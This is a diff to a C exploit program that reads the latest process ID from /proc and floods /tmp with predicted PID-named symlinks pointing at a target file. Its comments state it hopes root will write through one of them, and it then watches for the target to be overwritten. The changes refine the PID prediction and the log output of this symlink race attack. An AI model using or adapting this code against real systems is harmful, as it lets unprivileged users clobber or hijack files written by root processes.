@@ -46,9 +46,8 @@ main (int argc, char **argv)
   files *file_list, *tmp, *start;
   time_t t_time_watch, t_time;
 
-
-//  from = getpid ();
-  from = get_latest_pid ();
+  //latest pid read from PROC + 1 
+  from = (get_latest_pid ()) +1;
 
   if (argc < 4)
     {
@@ -88,7 +87,7 @@ main (int argc, char **argv)
   file_list->filename[0] = NULL;
   file_list->next = NULL;
 
-  printf ("Starting from our own process id: %d\n", from);
+  printf ("Starting from lastest process id read from %s: %d\n", PROC,from);
 
 
   i = stat (dest_name, &buf);
@@ -103,10 +102,11 @@ main (int argc, char **argv)
 
   t_time_watch = buf.st_mtim.tv_sec;
   //Create our block of symlinks that we hope root will write too.
+      printf ("Symlinking ");
   for (x = from; x < to; x++)
     {
       snprintf (tmp_name,MAXSIZE, "%s%d", from_name, x);
-      printf ("Symlinking %s->%s\n", tmp_name, dest_name);
+      printf ("%s->%s ", tmp_name, dest_name);
       tmp = malloc (sizeof (files));
       strncpy (tmp->filename, tmp_name,MAXSIZE);
       tmp->next = file_list->next;
@@ -123,7 +123,7 @@ main (int argc, char **argv)
 
 
   printf
-    ("Waiting on a write to one of our predicted links in /tmp or pid to grow past the links we created.\n");
+    ("\nWaiting on a write to one of our predicted links in /tmp or pid to grow past the links we created.\n");
 // Watch the target file to see if it's over written and check to see if the newest process pid
 // is larger than our biggest predicted pid.  If so exit because we failed.
   while (t_time == t_time_watch)
@@ -163,7 +163,6 @@ get_latest_pid (void)
   struct dirent *direntp;
   int x = 0, array[MAXSIZE];
 
-  // dirp = opendir ("/proc/pinfo");
   dirp = opendir (PROC);
   while ((direntp = readdir (dirp)) != NULL)
     {
@@ -197,12 +196,14 @@ unlink_files (files * fstruc)
   fstruc = fstruc->next;
   free (tmp);
   printf ("Cleaning up....\n");
+      printf ("Unlinking ");
   while (fstruc)
     {
       tmp = fstruc;
-      printf ("Unlinking -> %s\n", fstruc->filename);
+      printf ("%s ", fstruc->filename);
       unlink (fstruc->filename);
       fstruc = fstruc->next;
       free (tmp);
     }
+printf("\n");
 }
